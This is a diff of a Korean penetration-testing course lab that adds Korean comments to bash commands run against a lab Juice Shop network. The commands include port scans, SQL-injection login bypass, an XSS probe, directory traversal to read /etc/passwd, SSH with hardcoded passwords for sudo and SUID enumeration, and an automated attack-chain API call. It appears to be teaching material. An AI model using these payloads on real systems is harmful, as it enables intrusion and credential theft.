@@ -305,32 +305,32 @@ $ curl -s "http://10.20.30.80:3000/rest/products/search?q=test'%20OR%201=1--"
 
 ```bash
 # 환경 변수 설정
-export OPSCLAW_API_KEY="opsclaw-api-key-2026"
+export OPSCLAW_API_KEY="opsclaw-api-key-2026"          # 환경 변수 설정
 
 # === 전체 네트워크 스캔 ===
 
 # 1. 각 서버 포트 스캔
 echo "===== secu (10.20.30.1) ====="
-nmap -sT -F 10.20.30.1
+nmap -sT -F 10.20.30.1                                 # 포트 스캔
 
 echo ""
 echo "===== web (10.20.30.80) ====="
-nmap -sT -F 10.20.30.80
+nmap -sT -F 10.20.30.80                                # 포트 스캔
 
 echo ""
 echo "===== siem (10.20.30.100) ====="
-nmap -sT -F 10.20.30.100
+nmap -sT -F 10.20.30.100                               # 포트 스캔
 
 # 2. 서비스 버전 탐지 (web 서버)
-nmap -sV -p 22,80,3000 10.20.30.80
+nmap -sV -p 22,80,3000 10.20.30.80                     # 서비스 버전 탐지 / 지정 포트
 
 # 3. 웹 서비스 확인
-curl -s -o /dev/null -w "JuiceShop: %{http_code}\n" http://10.20.30.80:3000/
-curl -s -o /dev/null -w "Nginx/WAF: %{http_code}\n" http://10.20.30.80/
+curl -s -o /dev/null -w "JuiceShop: %{http_code}\n" http://10.20.30.80:3000/  # silent 모드
+curl -s -o /dev/null -w "Nginx/WAF: %{http_code}\n" http://10.20.30.80/  # silent 모드
 
 # 4. JuiceShop API 엔드포인트 탐색
-curl -s http://10.20.30.80:3000/api/ 2>/dev/null | head -c 300
-curl -s http://10.20.30.80:3000/rest/products/search?q=test | python3 -m json.tool 2>/dev/null | head -20
+curl -s http://10.20.30.80:3000/api/ 2>/dev/null | head -c 300  # silent 모드
+curl -s http://10.20.30.80:3000/rest/products/search?q=test | python3 -m json.tool 2>/dev/null | head -20  # silent 모드
 ```
 
 ### 실습 2: 취약점 분석 (30분)
@@ -341,31 +341,31 @@ curl -s http://10.20.30.80:3000/rest/products/search?q=test | python3 -m json.to
 # 1. SQL Injection 테스트
 echo "===== SQL Injection ====="
 curl -s "http://10.20.30.80:3000/rest/products/search?q=test'%20OR%201=1--" | \
-  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과: {len(d.get(\"data\",[]))}개')" 2>/dev/null
+  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과: {len(d.get(\"data\",[]))}개')" 2>/dev/null  # Python 코드 실행
 
 # 2. 인증 우회 테스트
 echo ""
 echo "===== 인증 우회 ====="
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"\" or 1=1--","password":"a"}' | head -c 200
+  -d '{"email":"\" or 1=1--","password":"a"}' | head -c 200  # 요청 데이터(body)
 
 # 3. XSS 테스트
 echo ""
 echo "===== XSS 검사 ====="
-curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | head -c 200
+curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | head -c 200  # silent 모드
 
 # 4. 디렉토리 트래버설 테스트
 echo ""
 echo "===== 디렉토리 트래버설 ====="
-curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd" | head -5
+curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd" | head -5  # silent 모드
 
 # === 서버 취약점 테스트 ===
 
 # 5. web 서버 권한 확인
 echo ""
 echo "===== 서버 권한 확인 ====="
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "echo 1 | sudo -S -l 2>/dev/null"
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 "echo 1 | sudo -S -l 2>/dev/null"  # 비밀번호 자동입력 SSH
 
 # 6. SUID 검사
 echo ""
@@ -384,6 +384,8 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
 
 ### 실습 3: 공격 실행 (30분)
 
+OpsClaw Manager API를 호출하여 작업을 수행합니다.
+
 ```bash
 # === OpsClaw 자동화 공격 ===
 
@@ -391,7 +393,7 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
 PROJECT=$(curl -s -X POST http://localhost:8000/projects \
   -H "Content-Type: application/json" \
   -H "X-API-Key: $OPSCLAW_API_KEY" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "name": "week15-final-pentest",
     "request_text": "기말 종합 침투 테스트",
     "master_mode": "external"
@@ -401,15 +403,15 @@ echo "프로젝트 ID: $PID"
 
 # Stage 전환
 curl -s -X POST "http://localhost:8000/projects/$PID/plan" \
-  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
+  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null         # API 인증 키
 curl -s -X POST "http://localhost:8000/projects/$PID/execute" \
-  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
+  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null         # API 인증 키
 
 # 정찰 + 공격 체인 실행
 curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
   -H "Content-Type: application/json" \
   -H "X-API-Key: $OPSCLAW_API_KEY" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "tasks": [
       {
         "order": 1,
@@ -447,6 +449,8 @@ curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
 ```
 
 ### 실습 4: 증거 수집 및 보고서 작성 (45분)
+
+OpsClaw Manager API를 호출하여 작업을 수행합니다.
 
 ```bash
 # 증거 요약
